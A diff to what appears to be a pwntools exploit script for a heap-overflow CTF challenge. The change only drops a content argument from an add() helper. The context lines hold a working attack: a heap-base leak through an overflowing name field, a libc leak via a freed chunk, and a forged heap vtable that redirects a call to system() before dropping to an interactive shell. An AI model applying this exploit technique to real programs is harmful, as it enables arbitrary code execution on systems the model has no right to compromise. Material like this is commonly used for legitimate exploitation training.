@@ -16,7 +16,7 @@ context.arch = "amd64"
 def opt(idx):
     p.sendlineafter("Your choice:",str(idx))
 
-def add(length,content):
+def add(length):
     opt(1)
     p.sendlineafter("Size:",str(length))
 
@@ -36,15 +36,15 @@ def show(idx):
 
 # leak heap base
 p.sendlineafter("Name:","a"*0x20)
-add(0x80,"a"*8) # 0
+add(0x80) # 0
 show(0)
 p.recvuntil("Name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
 heap_addr = u64(p.recv(3).ljust(8,"\0")) - 0x10
 log.success("heap_addr is -> "+ hex( heap_addr ))
 
 # leak libc addr
-add(0x80,"a"*8) # 1
-add(0x80,"a"*8) # 2
+add(0x80) # 1
+add(0x80) # 2
 free(1)
 edit(0,0x90,"a"*(0x90-2)+"zx")
 show(0)
@@ -67,7 +67,7 @@ vtable = heap_addr + 0x170
 system_addr = libc_addr + libc.sym["system"]
 edit(2,0x100,"\x00"*0x38+p64(vtable) + "b"*0x18 + p64(system_addr))
 
-add(0x80,"a")
+add(0x80)
 
 gdb.attach(p,"set $h=0x603000")
 p.interactive()
